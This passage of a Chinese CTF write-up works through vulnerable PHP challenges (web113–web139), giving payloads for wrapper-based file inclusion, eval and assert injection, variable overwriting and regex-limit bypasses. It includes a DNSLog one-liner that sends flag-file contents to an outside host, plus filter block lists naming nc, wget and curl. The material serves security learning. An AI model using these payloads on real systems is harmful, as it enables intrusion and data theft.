-    if(preg_match(&#39;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;,$file))&amp;#123;
-        die(&#39;hacker!&#39;);
-    &amp;#125;else&amp;#123;
-        return $file;
-    &amp;#125;
-&amp;#125;
-$file=$_GET[&#39;file&#39;];
-if(! is_file($file))&amp;#123;
-    highlight_file(filter($file));
-&amp;#125;else&amp;#123;
-    echo &amp;quot;hacker!&amp;quot;;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里没有过滤全，上面提到的 zilb:// 协议还能使用&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/?file=compress.zlib://flag.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214222732285.png&#34; alt=&#34;image-20230214222732285&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;或者利用 /proc/self/root 软链接，20 次软链接可以绕过 is_file ()&lt;/p&gt;
-&lt;h2 id=&#34;web114&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web114&#34;&gt;#&lt;/a&gt; web114&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-function filter($file)&amp;#123;
-    if(preg_match(&#39;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;,$file))&amp;#123;
-        die(&#39;hacker!&#39;);
-    &amp;#125;else&amp;#123;
-        return $file;
-    &amp;#125;
-&amp;#125;
-$file=$_GET[&#39;file&#39;];
-echo &amp;quot;师傅们居然tql都是非预期 哼！&amp;quot;;
-if(! is_file($file))&amp;#123;
-    highlight_file(filter($file));
-&amp;#125;else&amp;#123;
-    echo &amp;quot;hacker!&amp;quot;;
-&amp;#125; 师傅们居然tql都是非预期 哼！
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里过滤了 compress，root 但是又没有过滤 filter&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?file=php://filter/resource=flag.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;web115&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web115&#34;&gt;#&lt;/a&gt; web115&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&#39;flag.php&#39;);
-highlight_file(__FILE__);
-error_reporting(0);
-function filter($num)&amp;#123;
-    $num=str_replace(&amp;quot;0x&amp;quot;,&amp;quot;1&amp;quot;,$num);
-    $num=str_replace(&amp;quot;0&amp;quot;,&amp;quot;1&amp;quot;,$num);
-    $num=str_replace(&amp;quot;.&amp;quot;,&amp;quot;1&amp;quot;,$num);
-    $num=str_replace(&amp;quot;e&amp;quot;,&amp;quot;1&amp;quot;,$num);
-    $num=str_replace(&amp;quot;+&amp;quot;,&amp;quot;1&amp;quot;,$num);
-    return $num;
-&amp;#125;
-$num=$_GET[&#39;num&#39;];
-if(is_numeric($num) and $num!==&#39;36&#39; and trim($num)!==&#39;36&#39; and filter($num)==&#39;36&#39;)&amp;#123;
-    if($num==&#39;36&#39;)&amp;#123;
-        echo $flag;
-    &amp;#125;else&amp;#123;
-        echo &amp;quot;hacker!!&amp;quot;;
-    &amp;#125;
-&amp;#125;else&amp;#123;
-    echo &amp;quot;hacker!!!&amp;quot;;
-&amp;#125; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;本题主要考察绕过 is_numeric，!== 不全等，数值或者类型不相同&lt;/p&gt;
-&lt;p&gt;在数字的前面加上 %09 %0a %0b %0c %0d 任意一个都可以使其为真不影响判断。&lt;/p&gt;
-&lt;p&gt;对于 trim 函数首位去空，可以去除空格以及 &lt;code&gt;\n\r\t\v\0&lt;/code&gt; ，但不会过滤 &lt;code&gt;\f&lt;/code&gt; ，于是本题可以使用 %0c 绕过&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214225308922.png&#34; alt=&#34;image-20230214225308922&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web123&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web123&#34;&gt;#&lt;/a&gt; web123&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&amp;quot;flag.php&amp;quot;);
-$a=$_SERVER[&#39;argv&#39;];
-$c=$_POST[&#39;fun&#39;];
-if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;amp;&amp;amp;!isset($_GET[&#39;fl0g&#39;]))&amp;#123;
-    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&#39;|\,|\.|\;|\?/&amp;quot;, $c)&amp;amp;&amp;amp;$c&amp;lt;=18)&amp;#123;
-         eval(&amp;quot;$c&amp;quot;.&amp;quot;;&amp;quot;);  
-         if($fl0g===&amp;quot;flag_give_me&amp;quot;)&amp;#123;
-             echo $flag;
-         &amp;#125;
-    &amp;#125;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;本题没啥限制，直接上 payload：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?CTF_SHOW=&amp;amp;CTF[SHOW.COM=&amp;amp;fun=echo%20$flag
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里不用 CTF_SHOW.COM 的原因是因为这里又一个点，变量名重只能有数字字母下划线，所以我们构造不出来原参数，被 get 或者 post 传入的变量名，如果含有空格、+、[则会被转化为_，php 中有个特性就是如果传入 [，它被转化为_之后，后面的字符就会被保留下来不会被替换，所以这里要使用 [&lt;/p&gt;
-&lt;h2 id=&#34;web125&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web125&#34;&gt;#&lt;/a&gt; web125&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&amp;quot;flag.php&amp;quot;);
-$a=$_SERVER[&#39;argv&#39;];
-$c=$_POST[&#39;fun&#39;];
-if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;amp;&amp;amp;!isset($_GET[&#39;fl0g&#39;]))&amp;#123;
-    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&amp;quot;, $c)&amp;amp;&amp;amp;$c&amp;lt;=16)&amp;#123;
-         eval(&amp;quot;$c&amp;quot;.&amp;quot;;&amp;quot;);
-         if($fl0g===&amp;quot;flag_give_me&amp;quot;)&amp;#123;
-             echo $flag;
-         &amp;#125;
-    &amp;#125;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;比起上一题多了一些过滤，如 echo，flag 等等，构造命令执行发现没反应，大概是 ban 掉了，但是高亮函数应该没禁用，毕竟本题还使用了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214231811542.png&#34; alt=&#34;image-20230214231811542&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web126&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web126&#34;&gt;#&lt;/a&gt; web126&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&amp;quot;flag.php&amp;quot;);
-$a=$_SERVER[&#39;argv&#39;];
-$c=$_POST[&#39;fun&#39;];
-if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;amp;&amp;amp;!isset($_GET[&#39;fl0g&#39;]))&amp;#123;
-    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&amp;quot;, $c) &amp;amp;&amp;amp; strlen($c)&amp;lt;=16)&amp;#123;
-         eval(&amp;quot;$c&amp;quot;.&amp;quot;;&amp;quot;);  
-         if($fl0g===&amp;quot;flag_give_me&amp;quot;)&amp;#123;
-             echo $flag;
-         &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;本题过滤名单加上了几个字母 g|i|f|c|o|d，那么上面一题的高亮用法也被过滤了，那么 get 和 post 就不能再使用了，而且这里存在长度限制。最后还有的办法就是利用原有的 echo 语句输出 flag&lt;/p&gt;
-&lt;p&gt;parse_str () 函数把查询字符串解析到变量中&lt;/p&gt;
-&lt;p&gt;assert () 判断一个表达式是否成立，之间的代码会被执行&lt;/p&gt;
-&lt;p&gt;看到 $a=$_SERVER [&#39;argv&#39;];，这里可以利用，“$argv” 用于存放指向字符串的参数，是传递给脚本的参数数组，每一个元素指向一个参数，第一个参数总是当前脚本的文件名；&lt;/p&gt;
-&lt;p&gt;这里测试一下，注意这里需要将 register_argc_argv 配置项改为为 no，&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215135512053.png&#34; alt=&#34;image-20230215135512053&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;cli 模式下&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215162645586.png&#34; alt=&#34;image-20230215162645586&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;网页模式下&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215162736593.png&#34; alt=&#34;image-20230215162736593&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;本题的逻辑就显而易见了，前面的 CTF_SHOWW 不变，fun=assert ($a [0])，这样就会执行 $a [0] 的参，get 传入一个？$fl0g=flag_give_me，就会将这一句话通过断言执行，成功将 $fl0g 赋值，通过原有的 echo 语句输出 flag&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215164257976.png&#34; alt=&#34;image-20230215164257976&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web127&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web127&#34;&gt;#&lt;/a&gt; web127&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-$ctf_show = md5($flag);
-$url = $_SERVER[&#39;QUERY_STRING&#39;];
-//特殊字符检测
-function waf($url)&amp;#123;
- if(preg_match(&#39;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&amp;#123;|\;|\:|\[|\]|\&amp;#125;|\&#39;|\&amp;quot;|\&amp;lt;|\,|\&amp;gt;|\.|\\\|\//&#39;, $url))&amp;#123;
-        return true;
-    &amp;#125;else&amp;#123;
-        return false;
-    &amp;#125;
-&amp;#125;
-if(waf($url))&amp;#123;
-    die(&amp;quot;嗯哼？&amp;quot;);
-&amp;#125;else&amp;#123;
-    extract($_GET);
-&amp;#125;
-if($ctf_show===&#39;ilove36d&#39;)&amp;#123;
-    echo $flag;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;extract () 函数从数组中将变量导入到当前的符号表。&lt;/p&gt;
-&lt;p&gt;没啥限制，直接变量覆盖，这里下划线被过滤，尝试 [[空格], 空格可以直接绕过&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230215165026747.png&#34; alt=&#34;image-20230215165026747&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web128&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web128&#34;&gt;#&lt;/a&gt; web128&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-
-$f1 = $_GET[&#39;f1&#39;];
-$f2 = $_GET[&#39;f2&#39;];
-
-if(check($f1))&amp;#123;
-    var_dump(call_user_func(call_user_func($f1,$f2)));
-&amp;#125;else&amp;#123;
-    echo &amp;quot;嗯哼？&amp;quot;;
-&amp;#125;
-function check($str)&amp;#123;
-    return !preg_match(&#39;/[0-9]|[a-z]/i&#39;, $str);
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;call_user_func () 回调函数，看到这个函数自然想到使得第一个参数称为一个危险函数，但是 check 将所有的数字字母都过滤了，但是这里没有过滤符号，想到有一个奇怪的东西_()，_()==gettext () 是 gettext () 的拓展函数，开启 text 扩展。需要 php 扩展目录下有 php_gettext.dll&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;get_defined_vars()&lt;/strong&gt; 函数返回由所有已定义变量所组成的数组。&lt;/p&gt;
-&lt;p&gt;当正常的 gettext (“get_defined_vars”); 时会返还 get_defined_vars，外层的回调函数再调用 get_defined_vars 打印所有已经定义的变量&lt;/p&gt;
-&lt;p&gt;payload: ?f1=_&amp;amp;f2=get_defined_vars&lt;/p&gt;
-&lt;h2 id=&#34;web129&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web129&#34;&gt;#&lt;/a&gt; web129&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;f&#39;]))&amp;#123;
-    $f = $_GET[&#39;f&#39;];
-    if(stripos($f, &#39;ctfshow&#39;)&amp;gt;0)&amp;#123;
-        echo readfile($f);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;stripos () 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。这里直接目录穿越即可&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215201702900.png&#34; alt=&#34;image-20230215201702900&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web130&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web130&#34;&gt;#&lt;/a&gt; web130&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&amp;quot;flag.php&amp;quot;);
-if(isset($_POST[&#39;f&#39;]))&amp;#123;
-    $f = $_POST[&#39;f&#39;];
-    if(preg_match(&#39;/.+?ctfshow/is&#39;, $f))&amp;#123;
-        die(&#39;bye!&#39;);
-    &amp;#125;
-    if(stripos($f, &#39;ctfshow&#39;) === FALSE)&amp;#123;
-        die(&#39;bye!!&#39;);
-    &amp;#125;
-    echo $flag;
-
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215201952640.png&#34; alt=&#34;image-20230215201952640&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里的是.+?，所以是 ctfshow 前面至少加一个东西才能匹配到，直接传 ctfshow 即可，或者数组绕过，stripos 不处理数组&lt;/p&gt;
-&lt;h2 id=&#34;web131&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web131&#34;&gt;#&lt;/a&gt; web131&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&amp;quot;flag.php&amp;quot;);
-if(isset($_POST[&#39;f&#39;]))&amp;#123;
-    $f = (String)$_POST[&#39;f&#39;];
-
-    if(preg_match(&#39;/.+?ctfshow/is&#39;, $f))&amp;#123;
-        die(&#39;bye!&#39;);
-    &amp;#125;
-    if(stripos($f,&#39;36Dctfshow&#39;) === FALSE)&amp;#123;
-        die(&#39;bye!!&#39;);
-    &amp;#125;
-
-    echo $flag;
-
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;str_repeat () 函数把字符串重复指定的次数。&lt;/p&gt;
-&lt;p&gt;PHP 为了防止正则表达式的拒绝服务击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false, 这样就可以绕过第一个正则表达式了&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
-
-url=&amp;quot;http://151cbf5e-eff1-412c-98b3-a1fc814ced40.challenge.ctf.show/&amp;quot;
-data=&amp;#123;
-    &amp;quot;f&amp;quot;:&amp;quot;a&amp;quot;*1000000+&amp;quot;36Dctfshow&amp;quot;
-&amp;#125;
-
-r=requests.post(url,data)
-print(r.text)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215204538988.png&#34; alt=&#34;image-20230215204538988&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;后篇&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后篇&#34;&gt;#&lt;/a&gt; 后篇&lt;/h1&gt;
-&lt;h2 id=&#34;web132&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web132&#34;&gt;#&lt;/a&gt; web132&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215205118383.png&#34; alt=&#34;image-20230215205118383&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;扫描得到，访问 admin&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-#error_reporting(0);
-include(&amp;quot;flag.php&amp;quot;);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;username&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;password&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;code&#39;]))&amp;#123;
-    $username = (String)$_GET[&#39;username&#39;];
-    $password = (String)$_GET[&#39;password&#39;];
-    $code = (String)$_GET[&#39;code&#39;];
-
-    if($code === mt_rand(1,0x36D) &amp;amp;&amp;amp; $password === $flag || $username ===&amp;quot;admin&amp;quot;)&amp;#123;
-        
-        if($code == &#39;admin&#39;)&amp;#123;
-            echo $flag;
-        &amp;#125;       
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里有 ||，只需要满足前面两个或者后面一个即可，所以这里给 username 传入一个 admin 绕过&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215210142212.png&#34; alt=&#34;image-20230215210142212&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web133&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web133&#34;&gt;#&lt;/a&gt; web133&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-//flag.php
-if($F = @$_GET[&#39;F&#39;])&amp;#123;
-    if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F))&amp;#123;
-        eval(substr($F,0,6));
-    &amp;#125;else&amp;#123;
-        die(&amp;quot;6个字母都还不够呀?!&amp;quot;);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;本题 emmm 长度限制为 6，危险函数限制，这里构造一个&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;`$F`; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;注意这里后面是有空格的，刚好 6 个字符，就可以通过反引号执行命令，但是执行完命令后发现没有回显&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Ruc2xvZy5jbi8=&#34;&gt; DNSLog Platform&lt;/span&gt; 通过这个在线工具，带出回显的结果&lt;/p&gt;
-&lt;p&gt;payload：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?F=`$F`;+ping `cat flag.php|grep ctfshow`.cez6di.dnslog.cn -c 1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230216002935763.png&#34; alt=&#34;image-20230216002935763&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web134&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web134&#34;&gt;#&lt;/a&gt; web134&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-$key1 = 0;
-$key2 = 0;
-if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &amp;#123;
-    die(&amp;quot;nonononono&amp;quot;);
-&amp;#125;
-@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);
-extract($_POST);
-if($key1 == &#39;36d&#39; &amp;amp;&amp;amp; $key2 == &#39;36d&#39;) &amp;#123;
-    die(file_get_contents(&#39;flag.php&#39;));
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;extract () : 将数组转换为多个变量&lt;/p&gt;
-&lt;p&gt;$_SERVER [&#39;QUERY_STRING&#39;] 获取 URL 数据，将数据转换为数组，获取单个数组元素&lt;/p&gt;
-&lt;p&gt;parse_str () 函数把查询字符串解析到变量中&lt;/p&gt;
-&lt;p&gt;payload:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?_POST[key1]=36d&amp;amp;_POST[key2]=36d
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;web135&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web135&#34;&gt;#&lt;/a&gt; web135&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-//flag.php
-if($F = @$_GET[&#39;F&#39;])&amp;#123;
-    if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F))&amp;#123;
-        eval(substr($F,0,6));
-    &amp;#125;else&amp;#123;
-        die(&amp;quot;师傅们居然破解了前面的，那就来一个加强版吧&amp;quot;);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这一题是 web133 的 “升级” 版本，打开文件的命令都被 ban 了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?F=`$F`;+cp%20flag.php%201.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230216213028644.png&#34; alt=&#34;image-20230216213028644&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web136&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web136&#34;&gt;#&lt;/a&gt; web136&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-function check($x)&amp;#123;
-    if(preg_match(&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;amp;|\*|\?|\&amp;#123;|\&amp;#125;|\&amp;gt;|\&amp;lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;, $x))&amp;#123;
-        die(&#39;too young too simple sometimes naive!&#39;);
-    &amp;#125;
-&amp;#125;
-if(isset($_GET[&#39;c&#39;]))&amp;#123;
-    $c=$_GET[&#39;c&#39;];
-    check($c);
-    exec($c);
-&amp;#125;
-else&amp;#123;
-    highlight_file(__FILE__);
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;tee 命令用于读取标准输入的数据，这里可以将执行的结果输入到新的文件然后读取&lt;/p&gt;
-&lt;p&gt;payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?c=ls /| tee 1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里会将 ls / 的查询结果写入 1 中&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217104454990.png&#34; alt=&#34;image-20230217104454990&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;再读取文件就可以了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?c=cat /f149_15_h3r3| tee 1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217104616360.png&#34; alt=&#34;image-20230217104616360&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web137&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web137&#34;&gt;#&lt;/a&gt; web137&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-class ctfshow
-&amp;#123;
-    function __wakeup()&amp;#123;
-        die(&amp;quot;private class&amp;quot;);
-    &amp;#125;
-    static function getFlag()&amp;#123;
-        echo file_get_contents(&amp;quot;flag.php&amp;quot;);
-    &amp;#125;
-&amp;#125;
-call_user_func($_POST[&#39;ctfshow&#39;]);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里直接调用静态方法即可，payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ctfshow=ctfshow::getFlag
-ctfshow[0]=ctfshow&amp;amp;ctfshow[1]=getFlag
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217152126627.png&#34; alt=&#34;image-20230217152126627&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web138&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web138&#34;&gt;#&lt;/a&gt; web138&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-class ctfshow
-&amp;#123;
-    function __wakeup()&amp;#123;
-        die(&amp;quot;private class&amp;quot;);
-    &amp;#125;
-    static function getFlag()&amp;#123;
-        echo file_get_contents(&amp;quot;flag.php&amp;quot;);
-    &amp;#125;
-&amp;#125;
-
-if(strripos($_POST[&#39;ctfshow&#39;], &amp;quot;:&amp;quot;)&amp;gt;-1)&amp;#123;
-    die(&amp;quot;private function&amp;quot;);
-&amp;#125;
-call_user_func($_POST[&#39;ctfshow&#39;]);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;：被 ban，还可以使用上面数组的方式&lt;/p&gt;
-&lt;p&gt;call_user_func 函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ctfshow[0]=ctfshow&amp;amp;ctfshow[1]=getFlag
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;web139&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web139&#34;&gt;#&lt;/a&gt; web139&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
-error_reporting(0);
-function check($x)&amp;#123;
-    if(preg_match(&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;amp;|\*|\?|\&amp;#123;|\&amp;#125;|\&amp;gt;|\&amp;lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;, $x))&amp;#123;
-        die(&#39;too young too simple sometimes naive!&#39;);
-    &amp;#125;
-&amp;#125;
-if(isset($_GET[&#39;c&#39;]))&amp;#123;
-    $c=$_GET[&#39;c&#39;];
-    check($c);
-    exec($c);
-&amp;#125;
-else&amp;#123;
-    highlight_file(__FILE__);
-&amp;#125;
-?&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这题好像和 136 一样但是使用 tee 命令却带不出回显了这里使用了一个新的命令 awk&lt;/p&gt;
-&lt;p&gt;AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217183611353.png&#34; alt=&#34;image-20230217183611353&#34; /&gt;&lt;/p&gt;
